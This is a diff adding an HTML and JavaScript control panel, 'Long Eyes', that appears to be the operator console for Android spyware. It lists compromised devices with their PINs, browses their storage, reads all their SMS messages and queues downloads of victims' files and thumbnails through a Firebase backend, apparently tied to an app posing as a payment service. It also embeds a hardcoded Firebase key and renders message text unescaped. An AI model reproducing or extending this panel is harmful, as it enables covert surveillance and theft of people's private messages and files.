@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Long Eyes</title>
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">
+    <link rel="manifest" href="/assets/favicon/site.webmanifest">
+    <script src="https://www.gstatic.com/firebasejs/8.2.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.1.2/firebase-firestore.js"></script>
+    <script type="text/javascript" src="/assets/js/murmurhash3js.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        #device-list, #folder-content {
+            margin-top: 20px;
+        }
+        .device-item, .folder-item, .file-item {
+            cursor: pointer;
+            padding: 10px;
+            border: 1px solid #ddd;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .device-item:hover, .folder-item:hover, .file-item:hover {
+            background-color: #f0f0f0;
+        }
+        .file-thumbnail {
+            width: 48px;
+            height: 48px;
+            margin-right: 10px;
+            object-fit: cover;
+        }
+        .file-icon {
+            width: 48px;
+            height: 48px;
+            margin-right: 10px;
+            background: url('file-icon.png') no-repeat center center;
+            background-size: cover;
+        }
+        .folder-menu {
+            display: flex;
+            justify-content: space-between;
+        }
+        .back-button, .download-button {
+            cursor: pointer;
+            padding: 10px;
+            background: #ddd;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .folder-menu {
+            margin-bottom: 20px;
+        }
+        .back-button:hover, .download-button:hover {
+            opacity: 0.5;
+        }
+        .download-button {
+            background: #6565ee;
+            color: #fff;
+        }
+        .download-button, .download-wait, .download-link {
+            margin-left: 10px;
+        }
+        .download-button, .download-wait {
+            cursor: pointer;
+        }
+        .download-wait {
+            font-style: italic;
+            font-weight: bold;
+        }
+        .container {
+            width: 100%;
+            max-width: 700px;
+            margin: 50px auto;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+        .container h1 {
+            text-align: center;
+        }
+        .tab {
+            display: flex;
+            border-bottom: 1px solid #ccc;
+        }
+        .tab button {
+            flex: 1;
+            background-color: inherit;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            padding: 14px 7;
+            transition: 0.3s;
+            font-size: 17px;
+            text-align: center;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+        }
+        .tab button img {
+            width: 48px;
+            height: 48px;
+        }
+        .tab button:hover {
+            background-color: #ddd;
+        }
+        .tab button.active {
+            background-color: #ccc;
+        }
+        .tab-content {
+            display: none;
+            padding: 20px;
+            border-top: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        
+        #sms-content {
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+
+        #sms-content.single {
+            border: 1px solid #e8e8e8;
+        }
+
+        .sms-content-list {
+            height: 70vh;
+            overflow-y: auto;
+            padding: 0.5rem;
+        }
+        
+        .header-view {
+            background: #e8e8e8;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 0.5rem;
+        }
+        .sms-back-button {
+            margin-right: 0.5rem;
+            margin-bottom: 0px !important;
+        }
+        .address-view {
+            font-weight: bold;
+        }
+
+        .sms-item {
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            padding: 10px;
+            background: #f9f9f9;
+            transition: background-color 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+        }
+
+        .sms-item:hover {
+            background-color: #e3e3e3;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .sms-item div {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sms-item strong {
+            color: #555;
+        }
+
+        .sms-item small {
+            color: #888;
+        }
+
+        .sms-item:last-child {
+            margin-bottom: 0;
+        }
+
+        /* Style for the SMS reading view */
+        .sms-detail {
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            padding: 10px;
+            background: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .sms-detail div {
+            margin-bottom: 10px;
+        }
+
+        .sms-detail strong {
+            color: #333;
+        }
+
+        .sms-detail p {
+            margin: 0;
+            font-size: 14px;
+        }
+
+        .sms-detail .date {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .back-button {
+            background-color: #4CAF50;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            text-align: center;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .back-button:hover {
+            background-color: #45a049;
+        }
+        .breadcrumb {
+            margin-bottom: 20px;
+            padding: 10px;
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .breadcrumb a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        .breadcrumb span {
+            margin-right: 5px;
+        }
+
+        .breadcrumb ul {
+            display: flex;
+            justify-content: flex-start;
+            align-items: flex-end;
+        }
+        .breadcrumb ul li {
+            list-style: none;
+        }
+        .breadcrumb ul li img.icon {
+            width: 32px;
+            height: 32px;
+        }
+        .breadcrumb ul li::after {
+            display: absolute;
+            content: "/";
+            margin: 0px 0.2rem;
+        }
+        .empty-folder {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 2rem;
+        }
+        .empty-folder img {
+            width: 200px;
+            height: 200px;
+            margin-bottom: 1rem;
+        }
+        .empty-folder div {
+            font-size: 2.5rem;
+            font-weight: bold;
+        }
+        .header, .header > div {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: flex-start;
+        }
+        .header > div {
+            width: 100%;
+            flex-direction: row;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+        .title {
+            color: #cd596b;
+            align-self: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div>
+                <img src="/assets/images/logo.png" />
+                <button onclick="showDevices()" style="cursor: pointer;">Devices</button>
+            </div>
+            <h1 class="title">Long Eyes</h1>
+        </div>
+        <div id="device-list"></div>
+        <div id="device-content" style="display: none;">
+            <div class="tab">
+                <button class="tablinks active" onclick="openTab(event, 'Folders')">
+                    <img src="/assets/images/icons/file-explorer.png" />
+                    <div>File Explorer</div>
+                </button>
+                <button class="tablinks" onclick="openTab(event, 'SMS')">
+                    <img src="/assets/images/icons/sms.png" />
+                    <div>SMS</div>
+                </button>
+                <button class="tablinks" onclick="openTab(event, 'Commands')">
+                    <img src="/assets/images/icons/command.png" />
+                    <div>Command</div>
+                </button>
+            </div>
+        
+            <div id="Folders" class="tab-content active">
+                <h2>File Explorer</h2>
+                <div class="breadcrumb" id="breadcrumb"></div>
+                <div id="folder-content"></div>
+            </div>
+        
+            <div id="SMS" class="tab-content">
+                <h2>SMS</h2>
+                <div id="sms-content"></div>
+            </div>
+        
+            <div id="Commands" class="tab-content">
+                <h2>Command</h2>
+                <div id="commands-content"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCIb8e1VVHHw1bC-Ay9LJlRR2cXrzKsLtg",
+            authDomain: "feyi-pay.firebaseapp.com",
+            projectId: "feyi-pay",
+            storageBucket: "feyi-pay.appspot.com",
+            messagingSenderId: "290524642896",
+            appId: "1:290524642896:web:fb773fa3feddaddb3a1b55",
+            measurementId: "G-QV0J6KYS5Z"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        const deviceList = document.getElementById('device-list');
+        const deviceContent = document.getElementById('device-content');
+        const breadcrumb = document.getElementById('breadcrumb');
+        const folderContent = document.getElementById('folder-content');
+        const smsContent = document.getElementById('sms-content');
+
+        let pendingFileDownloads = {};
+        let pendingThumbDownloads = {};
+        let pendingBatchFileDownloads = {};
+        let pendingBatchThumbDownloads = {};
+
+        let devices = {}
+
+        let root = null
+        let currentPath = [];
+        let currentDeviceId = null;
+        
+        let unsubscribeFunctions = [];
+        let smsData = {};
+
+        function generateDeterministicId(input) {
+            // Use MurmurHash3 32-bit fixed variant
+            return murmurHash3_32Hex(input);
+        }
+
+        function getFileId(deviceId, collection, filePath) {
+            return generateDeterministicId(deviceId + collection + pathToFilename(filePath));
+        }
+
+        function pathToFilename(filepath) {
+            if (filepath == null) {
+                return "";
+            }
+            return filepath.replace(/[\/]+/g, " ").trim().replace(/[\s]+/g, "-");
+        }
+
+        function showDevices() {
+            deviceList.innerHTML = '';
+            currentPath = []
+            breadcrumb.innerHTML = '';
+            currentDeviceId = null
+            Object.values(devices).forEach((device) => {
+                const deviceItem = document.createElement('div');
+                deviceItem.className = 'device-item';
+                deviceItem.innerText = `${device.model}(${device.pin}) - ${device.id}`;
+                deviceItem.onclick = () => {
+                    subscribeToDeviceDownloads(device.id);
+                    fetchFolderMap(device.id, '');
+                }
+                deviceList.appendChild(deviceItem);
+            });
+            deviceList.style.display = 'block';
+            deviceContent.style.display = 'none';
+            folderContent.innerHTML = '';
+            smsContent.innerHTML = '';
+        }
+        function unsubscribeAll() {
+            unsubscribeFunctions.forEach(unsubscribe => unsubscribe());
+            unsubscribeFunctions = [];
+        }
+
+        function subscribeToDeviceDownloads(deviceId) {
+            unsubscribeAll();
+
+            unsubscribeFunctions.push(db.collection("pending_downloads")
+                .where("type", "==", "thumb_downloads")
+                .where("deviceId", "==", deviceId)
+                .onSnapshot(snapshot => {
+                    pendingThumbDownloads = {};
+                    snapshot.forEach(doc => {
+                        const data = doc.data();
+                        pendingThumbDownloads[doc.id] = data;
+                    });
+                    // Refresh the displayed folder content to reflect any updates
+                    if (currentDeviceId) {
+                        fetchFolderMap(currentDeviceId, currentPath.join('/'));
+                    }
+                })
+            );
+
+            unsubscribeFunctions.push(db.collection("pending_downloads")
+                .where("type", "==", "file_downloads")
+                .where("deviceId", "==", deviceId)
+                .onSnapshot(snapshot => {
+                    pendingFileDownloads = {};
+                    snapshot.forEach(doc => {
+                        const data = doc.data();
+                        pendingFileDownloads[doc.id] = data;
+                    });
+                    // Refresh the displayed folder content to reflect any updates
+                    if (currentDeviceId) {
+                        fetchFolderMap(currentDeviceId, currentPath.join('/'));
+                    }
+                })
+            );
+
+            unsubscribeFunctions.push(db.collection("sms")
+                .where("deviceId", "==", deviceId)
+                .orderBy("date", "desc")
+                .onSnapshot(snapshot => {
+                    smsData = {};
+                    snapshot.forEach(doc => {
+                        const data = doc.data();
+                        const address = data.address;
+
+                        if (!smsData[address]) {
+                            smsData[address] = {
+                                count: 0,
+                                latest: data,
+                                allMessages: []
+                            };
+                        }
+
+                        smsData[address].count++;
+                        smsData[address].allMessages.push(data);
+                    });
+                    displaySmsPreview();
+                })
+            );
+
+            currentDeviceId = deviceId;
+        }
+
+        function displaySmsPreview() {
+            smsContent.innerHTML = '';
+            smsContent.classList = ""
+
+            console.log("displaySmsPreview:1 ", smsData)
+            Object.entries(smsData).forEach(([address, data]) => {
+                console.log("displaySmsPreview:2 ", `address: ${address} | data: `, data)
+                const smsItem = document.createElement('div');
+                smsItem.className = 'sms-item';
+                const latestMessage = data.latest.body.length > 50 ? `${data.latest.body.slice(0, 50)}...` : data.latest.body;
+                smsItem.innerHTML = `<div><strong>${address}</strong> (${data.count} messages)<br>${latestMessage}<br><small>${data.latest.date.toDate().toLocaleString()}</small></div>`;
+                smsItem.onclick = () => {
+                    displaySmsDetail(address);
+                }
+                smsContent.appendChild(smsItem);
+            });
+        }
+
+        function displaySmsDetail(address) {
+            smsContent.innerHTML = '';
+            const addressSmsListContainer = document.createElement("div")
+            addressSmsListContainer.classList = "sms-content-list"
+            smsContent.classList = "single"
+
+            
+            const headerView = document.createElement('div');
+            headerView.classList = "header-view"
+
+
+            const backButton = document.createElement('div');
+            backButton.className = 'back-button sms-back-button';
+            backButton.innerText = '<< Back';
+            backButton.onclick = displaySmsPreview;
+            headerView.appendChild(backButton);
+
+            const addressView = document.createElement('div');
+            addressView.className = 'address-view';
+            addressView.innerText = address;
+            headerView.appendChild(addressView);
+
+            smsContent.appendChild(headerView)
+
+
+
+            smsData[address].allMessages.forEach(message => {
+                const smsDetail = document.createElement('div');
+                smsDetail.className = 'sms-detail';
+                smsDetail.innerHTML = `<div><strong>${message.date.toDate().toLocaleString()}</strong><br>${message.body}</div>`;
+                addressSmsListContainer.appendChild(smsDetail);
+            });
+            smsContent.appendChild(addressSmsListContainer)
+        }
+
+        // Fetch and display devices
+        db.collection("devices").onSnapshot((snapshot) => {
+            devices = {}
+            snapshot.forEach((doc) => {
+                devices[doc.id] = doc.data()
+            });
+            showDevices()
+        });
+
+        function fetchFolderMap(deviceId, folderPath) {
+            const device = devices[deviceId]
+            const deviceName =  `${device.model}`;
+            const url = device.url;
+            if(!url || url.length == 0) {
+                folderContent.innerHTML = `<p>Folders not uploaded yet for ${deviceName}.</p>`
+                deviceList.style.display = 'none';
+                deviceContent.style.display = 'block';
+                return;
+            }
+            fetch(url, {mode: 'cors'})
+            .then(async response => {
+                if(response.status == 404) {
+                    folderContent.innerHTML = `<p>Folders not uploaded yet for ${deviceName}.</p>`
+                    deviceList.style.display = 'none';
+                    deviceContent.style.display = 'block';
+
+                } else {
+                    try {
+                        const data = await response.json()
+                        currentDeviceId = deviceId;
+                        currentPath = folderPath.split("/")
+                        displayFolderContent(data, folderPath);
+
+                    } catch(e) {
+                        folderContent.innerHTML = `<p>Error: ${e?.error || e}</p>`
+                        deviceList.style.display = 'none';
+                        deviceContent.style.display = 'block';
+                    }
+                }
+                
+            })
+            .catch(e => {
+                folderContent.innerHTML = `<p>Error: ${e?.error || e}</p>`
+                deviceList.style.display = 'none';
+                deviceContent.style.display = 'block';
+            });
+        }
+
+        function formatFileSize(bytes) {
+            if (bytes < 1024) return bytes + ' Bytes';
+            else if (bytes < 1048576) return (bytes / 1024).toFixed(2) + ' KB';
+            else if (bytes < 1073741824) return (bytes / 1048576).toFixed(2) + ' MB';
+            else return (bytes / 1073741824).toFixed(2) + ' GB';
+        }
+
+        function getExt(filename) {
+            const exts = filename.split(".")
+            return exts[exts.length - 1].trim().toLowerCase()
+        }
+        
+        function filePathToIcon(filepath) {
+            const ext = getExt(filepath)
+            
+            const baseUrl = "/assets/images/icons"
+            if(["jpg", "jpeg"].includes(ext)) {
+                return `${baseUrl}/jpg.png`
+
+            } if(["png"].includes(ext)) {
+                return `${baseUrl}/png.png`
+
+            } else if(["mp3"].includes(ext)) {
+                return `${baseUrl}/mp3.png`
+                
+            } else if(["acc", "wav"].includes(ext)) {
+                return `${baseUrl}/music.png`
+                
+            } else if(["mp4", "mov"].includes(ext)) {
+                return `${baseUrl}/movie.png`
+                
+            } else if(["pdf"].includes(ext)) {
+                return `${baseUrl}/pdf.png`
+                
+            } else {
+                return `${baseUrl}/document.png`
+            }
+        }
+
+        function getElementsUpToIndex(arr, endIndex) {
+            // Validate input
+            if (!Array.isArray(arr)) {
+                throw new TypeError('First argument must be an array');
+            }
+            if (typeof endIndex !== 'number' || endIndex < 0 || endIndex >= arr.length) {
+                throw new RangeError('End index must be a non-negative number within the array bounds');
+            }
+
+            return arr.slice(0, endIndex + 1);
+        }
+
+        function displayBreadCrumb(folder, folderPath, item) {
+            const folderPaths = !folderPath? [''] : folderPath.split("/")
+            var contents = ""
+            var pos = 0;
+            for(const name of folderPaths) {
+                if(name.length == 0 && pos == 0) {
+                    contents += `<li><a href="#" data-target-path="${getElementsUpToIndex(folderPaths, pos).join("/")}" onclick="breadJump(event)">
+                        <img src="/assets/images/icons/home.png" class="icon" />
+                    </a></li>`;
+
+                } else if (name == "phoneStorage" && pos == 1) {
+                    contents += `<li><a href="#" data-target-path="${getElementsUpToIndex(folderPaths, pos).join("/")}" onclick="breadJump(event)">
+                        <img src="/assets/images/icons/hardisk.png" class="icon" />
+                    </a></li>`;
+
+                } else if(name == "sdCardStorage" && pos == 1) {
+                    contents += `<li><a href="#" data-target-path="${getElementsUpToIndex(folderPaths, pos).join("/")}" onclick="breadJump(event)">
+                        <img src="/assets/images/icons/sdcard.png" class="icon" />
+                    </a></li>`;
+
+                } else {
+                    contents += `<li><a href="#" data-target-path="${getElementsUpToIndex(folderPaths, pos).join("/")}" onclick="breadJump(event)">
+                        ${name}
+                    </a></li>`;
+                }
+                
+                pos++;
+            }
+            breadcrumb.innerHTML = `<ul>${contents}</ul>`;
+        }
+
+        function breadJump(e) {
+            e.preventDefault();
+            // Retrieve the data-target-path from the clicked link
+            const targetPath = e.currentTarget.getAttribute('data-target-path');
+            console.log('Target Path:', targetPath);
+            fetchFolderMap(currentDeviceId, targetPath)
+        }
+
+        function displayFolderContent(folder, folderPath, item) {
+            displayBreadCrumb(folder, folderPath, item)
+            console.log("pathhh: ", folderPath)
+            deviceList.style.display = 'none';
+            deviceContent.style.display = 'block';
+            folderContent.innerHTML = '';
+
+            if (folderPath) {
+                const folderMenu = document.createElement('div');
+                folderMenu.classList = "folder-menu"
+
+                const backButton = document.createElement('div');
+                backButton.className = 'back-button';
+                backButton.innerText = 'Go to Parent Folder';
+                backButton.onclick = () => navigateToParentFolder();
+                folderMenu.appendChild(backButton);
+
+                const filePath = item?.path || folderPath;
+                console.log("filePath: ", filePath, item?.path, folderPath)
+                const batchThumbId = getFileId(currentDeviceId, "batch_thumb_downloads", filePath);
+                const batchFileId = getFileId(currentDeviceId, "batch_file_downloads", filePath);
+
+                const batchThumbData = pendingBatchThumbDownloads[batchThumbId];
+                const batchFileData = pendingBatchFileDownloads[batchFileId];
+
+
+                if (!batchThumbData || batchThumbData.isDownloaded) {
+                    const downloadThumbails = document.createElement('div');
+                    downloadThumbails.className = 'download-button';
+                    downloadThumbails.innerText = 'Download Thumbnails';
+                    downloadThumbails.setAttribute("data-path", filePath);
+                    
+                    downloadThumbails.onclick = () => addToBatchDownloads(folder, folderPath, currentDeviceId, "thumb_downloads");
+                    folderMenu.appendChild(downloadThumbails);
+
+                } else if (!batchThumbData?.isDownloaded) {
+                    const downloadThumbails = document.createElement('span');
+                    downloadThumbails.className = 'download-wait';
+                    downloadThumbails.innerText = 'Awaiting Thumbnails';
+                    downloadThumbails.setAttribute("data-path", filePath);
+                    
+                    folderMenu.appendChild(downloadThumbails);
+                }
+
+                if (!batchFileData || batchFileData.isDownloaded) {
+                    const downloadFiles = document.createElement('div');
+                    downloadFiles.className = 'download-button';
+                    downloadFiles.innerText = 'Download Files';
+                    downloadFiles.setAttribute("data-path", filePath);
+                    
+                    downloadFiles.onclick = () => addToBatchDownloads(folder, folderPath, currentDeviceId, "file_downloads")
+                    folderMenu.appendChild(downloadFiles);
+
+                } else if (!batchFileData?.isDownloaded) {
+                    const downloadFiles = document.createElement('span');
+                    downloadFiles.className = 'download-wait';
+                    downloadFiles.innerText = 'Awaiting Files';
+                    downloadFiles.setAttribute("data-path", filePath);
+                    
+                    folderMenu.appendChild(downloadFiles);
+                }
+
+                folderContent.appendChild(folderMenu);
+            }
+
+            const items = folderPath ? getFolderAtPath(folder, folderPath) : folder;
+
+            if (items.children && items.children.length > 0) {
+                // Separate folders and files
+                const folders = items.children.filter(item => item.type === 'folder');
+                const files = items.children.filter(item => item.type === 'file');
+
+                // Sort folders and files by name in ascending order
+                folders.sort((a, b) => a.name.localeCompare(b.name));
+                files.sort((a, b) => a.name.localeCompare(b.name));
+
+                // Combine sorted folders and files
+                const sortedItems = [...folders, ...files];
+
+                sortedItems.forEach(item => {
+                    if (item.type === "folder") {
+                        const folderItem = document.createElement('div');
+                        folderItem.className = 'folder-item';
+
+                        let iconFilename = "folder.png"
+                        let name = item.name
+                        if(currentPath.length == 0) {
+                            iconFilename = "home.png"
+                            name = "ROOT"
+
+                        } else if(currentPath.length == 1 && item.name == "phoneStorage") {
+                            iconFilename = "hardisk.png"
+                            name = "Main Storage"
+
+                        } else if(currentPath.length == 1 && item.name == "sdCardStorage") {
+                            iconFilename = "sdcard.png"
+                            name = "SD Card"
+
+                        } else if(item.children.length > 0) {
+                            iconFilename = "folder.png"
+
+                        } else {
+                            iconFilename = "folder-empty.png"
+                        }
+
+                        const thumbnail = `<img class="file-thumbnail" src="/assets/images/icons/${iconFilename}">`;
+
+                        folderItem.innerHTML = `${thumbnail} <div>${name}</div>`;
+
+                        folderItem.onclick = () => {
+                            currentPath.push(item.name);
+                            displayFolderContent(folder, currentPath.join('/'), item);
+
+                            /*
+                            const path = item.path || item.name
+                            currentPath = path.split("/")
+                            displayFolderContent(folder, path, item);*/
+                        };
+                        folderContent.appendChild(folderItem);
+
+                    } else if (item.type === "file") {
+                        const filePath = item.path;
+                        const fileItem = document.createElement('div');
+                        fileItem.className = 'file-item';
+                        fileItem.setAttribute("data-path", item.path);
+
+                        const thumbId = getFileId(currentDeviceId, "thumb_downloads", item.path);
+                        const fileId = getFileId(currentDeviceId, "file_downloads", item.path);
+                        
+                        const thumbData = pendingThumbDownloads[thumbId];
+                        const fileData = pendingFileDownloads[fileId];
+
+                        const thumb = thumbData?.url ? thumbData.url : filePathToIcon(item.path);
+                        const thumbnail = `<img id="${thumbId}" class="file-thumbnail" src="${thumb}">`;
+
+                        const formattedSize = formatFileSize(item.size);
+                        fileItem.innerHTML = `${thumbnail} ${item.name} - ${formattedSize}`;
+
+                        if (!thumbData || thumbData.isDownloaded) {
+                            const downloadButton = document.createElement('button');
+                            downloadButton.className = 'download-button';
+                            downloadButton.innerText = 'Fetch Thumbnail';
+                            downloadButton.onclick = () => addToDownloads(filePath, currentDeviceId, "thumb_downloads", getFileId(currentDeviceId, "thumb_downloads", filePath));
+
+                            fileItem.appendChild(downloadButton);
+
+                        } else if (thumbData && !thumbData.isDownloaded && !thumbData?.url) {
+                            const downloadButton = document.createElement('span');
+                            downloadButton.className = 'download-wait';
+                            downloadButton.innerText = 'Awaiting Thumbnail';
+
+                            fileItem.appendChild(downloadButton);
+                        }
+
+                        if (!fileData) {
+                            const downloadButton2 = document.createElement('button');
+                            downloadButton2.className = 'download-button';
+                            downloadButton2.innerText = 'Download';
+                            downloadButton2.onclick = () => addToDownloads(filePath, currentDeviceId, "file_downloads", getFileId(currentDeviceId, "file_downloads", filePath));
+
+                            fileItem.appendChild(downloadButton2);
+
+                        } else if (!fileData.isDownloaded) {
+                            const downloadButton2 = document.createElement('span');
+                            downloadButton2.className = 'download-wait';
+                            downloadButton2.innerText = 'Awaiting Download';
+
+                            fileItem.appendChild(downloadButton2);
+
+                        } else if(fileData?.url) {
+                            const downloadLink = document.createElement('a');
+                            downloadLink.href = fileData.url;
+                            downloadLink.className = 'download-link';
+                            downloadLink.innerText = 'Download Link';
+                            downloadLink.target = '_blank';
+                            fileItem.appendChild(downloadLink);
+                        }
+
+                        folderContent.appendChild(fileItem);
+
+                    }
+                });
+
+            } else {
+                const empty = document.createElement('div');
+
+                const pathSections = (folderPath || '').split("/")
+                var name = [...pathSections].pop()
+                console.log("Empty:2 ", name, pathSections)
+                if(pathSections.length == 1) {
+                    name = "ROOT"
+
+                } else if(pathSections.length == 2 && name == "phoneStorage") {
+                    name = "Main Storage"
+
+                } else if(pathSections.length == 2 && name == "sdCardStorage") {
+                    name = "SD Card"
+
+                }
+
+                empty.innerHTML = `<div class="empty-folder">
+                    <img src="/assets/images/icons/folder-sad.png" />
+                    <div>${name} is Empty!</div>
+                    </div>`;
+                folderContent.appendChild(empty);
+            }
+        }
+
+        function getFolderAtPath(folder, folderPath) {
+            const pathArray = folderPath.split('/')
+            pathArray.shift()
+            let currentFolder = folder;
+            pathArray.forEach(segment => {
+                currentFolder = currentFolder.children.find(child => child.name === segment);
+            });
+            return currentFolder;
+        }
+
+        function navigateToParentFolder() {
+            currentPath.pop();
+            fetchFolderMap(currentDeviceId, currentPath.join('/'));
+        }
+
+        function addToDownloads(path, deviceId, type, id) {
+            db.collection("pending_downloads").doc(id).set({
+                path,
+                deviceId: deviceId,
+                isDownloaded: false,
+                type,
+                lastupdate: firebase.firestore.FieldValue.serverTimestamp() // Use Firebase server timestamp
+            }, { merge: true }).then(() => {
+                // alert('Download added to pending downloads');
+            }).catch(error => {
+                console.error('Error adding download:', error);
+            });
+        }
+
+        function addToBatchDownloads(folder, folderPath, currentDeviceId, type) {
+            const items = folderPath ? getFolderAtPath(folder, folderPath) : folder;
+
+            if (items.children) {
+                const files = items.children.filter(item => item.type === 'file');
+                files.sort((a, b) => a.name.localeCompare(b.name));
+
+                for (const file of files) {
+                    const id = getFileId(currentDeviceId, type, file.path)
+                    addToDownloads(file.path, currentDeviceId, type, id)
+                }
+            }
+        }
+
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tab-content");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].classList.remove("active");
+            }
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].classList.remove("active");
+            }
+            document.getElementById(tabName).classList.add("active");
+            evt.currentTarget.classList.add("active");
+        }
+    </script>
+</body>
+</html>
